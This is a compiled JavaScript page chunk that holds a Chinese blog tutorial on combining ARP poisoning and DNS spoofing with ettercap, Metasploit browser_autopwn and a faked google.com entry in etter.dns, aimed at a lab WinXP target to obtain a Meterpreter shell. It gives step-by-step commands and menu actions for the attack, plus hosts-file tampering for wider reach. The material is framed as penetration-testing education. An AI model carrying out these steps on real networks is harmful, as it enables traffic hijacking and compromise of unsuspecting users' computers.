(window.webpackJsonp=window.webpackJsonp||[]).push([[236],{530:function(a,t,s){"use strict";s.r(t);var n=s(7),r=Object(n.a)({},(function(){var a=this,t=a._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("h1",{attrs:{id:"与dns欺骗的结合使用"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#与dns欺骗的结合使用"}},[a._v("#")]),a._v(" 与DNS欺骗的结合使用")]),a._v(" "),t("p",[a._v("攻击机 Kali 192.168.175.128")]),a._v(" "),t("p",[a._v("靶机 WinXP 192.168.175.130")]),a._v(" "),t("p",[a._v("在《"),t("a",{attrs:{href:"https://blog.csdn.net/l1028386804/article/details/86632106",target:"_blank",rel:"noopener noreferrer"}},[a._v("客户端渗透之——浏览器渗透"),t("OutboundLink")],1),a._v("》和《"),t("a",{attrs:{href:"https://blog.csdn.net/l1028386804/article/details/86632147",target:"_blank",rel:"noopener noreferrer"}},[a._v("客户端渗透之——对网站的客户进行渗透"),t("OutboundLink")],1),a._v("》中，我们看到了一个传统的browser autopwn攻击以及改进后针对网站用户的攻击。其中，我们受到了一个约束，就是必须要通过某种方式将陷阱链接发送给受害者。在这篇文章中，我们不再向受害者发送任何链接，而是等待他们去浏览自己喜欢的网站。")]),a._v(" "),t("p",[a._v("这种攻击只能在局域网环境。因为若想采用这种方式，首先需要执行ARP欺骗。ARP工作在协议层的第二层，只有在同一个广播域下工作。但如果可以通过某种方式来修改远程受害者主机的hosts文件，我们就可以不用考虑这个限制，这通常被称为一个域欺骗攻击。")]),a._v(" "),t("h2",{attrs:{id:"使用dns劫持欺骗受害者"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用dns劫持欺骗受害者"}},[a._v("#")]),a._v(" 使用DNS劫持欺骗受害者")]),a._v(" "),t("p",[a._v("首先对受害者发起一个ARP毒化攻击，并执行DNS查询欺骗。因此，如果受害者试图打开一个常用的网站主页，例如http://google.com，结果却是打开了我们设置的browser autopwn服务的陷阱主页，进而使得他的系统遭到了来自陷阱网站的攻击。")]),a._v(" "),t("h2",{attrs:{id:"查找etter-dns文件"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#查找etter-dns文件"}},[a._v("#")]),a._v(" 查找etter.dns文件")]),a._v(" "),t("p",[a._v("我们需要创建一个DNS毒化列表，通过输入如下命令来找到伪造DNS条目保存的文件。")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[a._v("locate")]),a._v(" etter.dns\n\nroot@binghe:~"),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# locate etter.dns")]),a._v("\n/etc/ettercap/etter.dns\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br")])]),t("h2",{attrs:{id:"创造伪造dns列表"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#创造伪造dns列表"}},[a._v("#")]),a._v(" 创造伪造DNS列表")]),a._v(" "),t("p",[a._v("这里，我们使用的ARP毒化工具为ettercap,首先，找到 etter.dns 文件并创造一个伪造的DNS列表，为了实现这一点，需要修改etter.dns文件中的列表。")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[a._v("vim")]),a._v(" /etc/ettercap/etter.dns\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203421488.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("这里，我们加入了一行google.com A 192.168.175.128，这个假冒的DNS条目指向设置了browser autopwn服务的主机IP。因此，受害者并没有进入自己原计划的网站，而是进入了运行着browser autopwn服务的那个缺陷网站。")]),a._v(" "),t("p",[a._v("这样，当受害者发出一个关于域名http://google.com的DNS请求时，这个列表就会把攻击者计算机的IP地址作为响应发送给他。")]),a._v(" "),t("h2",{attrs:{id:"使用ettercap毒化内网"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#使用ettercap毒化内网"}},[a._v("#")]),a._v(" 使用ettercap毒化内网")]),a._v(" "),t("h2",{attrs:{id:"启动ettercap"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#启动ettercap"}},[a._v("#")]),a._v(" 启动ettercap")]),a._v(" "),t("p",[a._v("在Kali命令行运行命令：")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[a._v("ettercap "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-G")]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("启动ettercap图形界面。")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203512151.png",loading:"lazy"}})]),a._v(" "),t("h2",{attrs:{id:"选择网卡接口"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#选择网卡接口"}},[a._v("#")]),a._v(" 选择网卡接口")]),a._v(" "),t("p",[a._v("依次选择ettercap的Sniff->Unified sniffing...打开选择网卡的弹出框，选择eth0后确定。")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203533985.png",loading:"lazy"}})]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019012420354328.png",loading:"lazy"}})]),a._v(" "),t("h2",{attrs:{id:"扫描目标网络范围"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#扫描目标网络范围"}},[a._v("#")]),a._v(" 扫描目标网络范围")]),a._v(" "),t("p",[a._v("对目标网络范围内的主机IP进行扫描，验证哪些主机处于在线状态，")]),a._v(" "),t("p",[a._v("依次点击hosts->Scan for hosts")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203606592.png",loading:"lazy"}})]),a._v(" "),t("h2",{attrs:{id:"查看在线主机"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#查看在线主机"}},[a._v("#")]),a._v(" 查看在线主机")]),a._v(" "),t("p",[a._v("依次点击Hosts->Hosts list")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203626802.png",loading:"lazy"}})]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203635935.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("可以看到我们靶机IP 192.168.175.130也在结果列表中。")]),a._v(" "),t("h2",{attrs:{id:"配置网关和靶机ip"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#配置网关和靶机ip"}},[a._v("#")]),a._v(" 配置网关和靶机IP")]),a._v(" "),t("p",[a._v("这里，我们将网关的地址添加到目标2，将靶机IP添加到目标1，以后就将网关看作目标2，将靶机看作目标1。因为我们需要截获靶机发往网关的通信。")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203701243.png",loading:"lazy"}})]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203709825.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("添加后的结果：")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203725796.png",loading:"lazy"}})]),a._v(" "),t("h2",{attrs:{id:"设置arp-poisoning"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#设置arp-poisoning"}},[a._v("#")]),a._v(" 设置ARP Poisoning")]),a._v(" "),t("p",[a._v("依次点击Mitm->ARP poisoning")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019012420375615.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("选中Sniff remote connections后确定。")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203820767.png",loading:"lazy"}})]),a._v(" "),t("h2",{attrs:{id:"执行start-sniffing"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#执行start-sniffing"}},[a._v("#")]),a._v(" 执行Start Sniffing")]),a._v(" "),t("p",[a._v("依次点击 Start->Start sniffing")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019012420384134.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("这时，会输出一个“Unified sniffing already started...”的提示信息")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203859182.png",loading:"lazy"}})]),a._v(" "),t("h2",{attrs:{id:"激活dns欺骗插件程序"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#激活dns欺骗插件程序"}},[a._v("#")]),a._v(" 激活DNS欺骗插件程序")]),a._v(" "),t("p",[a._v("依次点击Plugins->Manage the plugins")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203914611.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("双击dns_spoof以激活DNS欺骗")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203930789.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("双击后的效果为：")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124203945594.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("这个插件被激活之后将会发送伪造的DNS数据，这些数据是我们之前在etter.dns中修改过的。因此，无论何时，只要受害者发送某个特定网站域名的DNS请求，攻击就会伪造一个响应，使用etter.dns文件中假冒的DNS条目来代替真实的条目。")]),a._v(" "),t("h2",{attrs:{id:"启动陷阱网站"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#启动陷阱网站"}},[a._v("#")]),a._v(" 启动陷阱网站")]),a._v(" "),t("p",[a._v("接下来在80端口启动陷阱网站")]),a._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[a._v("msfconsole\nuse auxiliary/server/browser_autopwn\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" LHOST "),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".175.128\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" SRVPORT "),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("80")]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("set")]),a._v(" URIPATH /\nexploit\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br"),t("span",{staticClass:"line-number"},[a._v("4")]),t("br"),t("span",{staticClass:"line-number"},[a._v("5")]),t("br"),t("span",{staticClass:"line-number"},[a._v("6")]),t("br")])]),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124204053680.png",loading:"lazy"}})]),a._v(" "),t("h2",{attrs:{id:"在靶机上访问链接"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#在靶机上访问链接"}},[a._v("#")]),a._v(" 在靶机上访问链接")]),a._v(" "),t("p",[a._v("在靶机上打开链接http://google.com")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124204120444.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("这样，我们就可以拿到靶机的Meterpreter。")]),a._v(" "),t("h2",{attrs:{id:"查看靶机的arp信息"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#查看靶机的arp信息"}},[a._v("#")]),a._v(" 查看靶机的ARP信息")]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190124204141828.png",loading:"lazy"}})]),a._v(" "),t("p",[a._v("可以看到攻击机和网关的Mac地址一样，这是我们对内网进行了ARP毒化的结果。")]),a._v(" "),t("p",[t("strong",[a._v("最后，这种方式只能用在局域网，如果想在一个广域网中实现这种攻击，就需要修改受害者的主机文件。这样当受害者试图访问一条执行的URL时，篡改过的主机文件条目将这个URL定向到那个恶意autopwn服务器上。")])]),a._v(" "),t("h2",{attrs:{id:"写在最后"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[a._v("#")]),a._v(" 写在最后")]),a._v(" "),t("blockquote",[t("p",[a._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),t("strong",[a._v("冰河技术")]),a._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),t("strong",[a._v("冰河技术")]),a._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),t("strong",[a._v("冰河技术")]),a._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),t("strong",[a._v("冰河技术")]),a._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),a._v(" "),t("p",[t("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);t.default=r.exports}}]);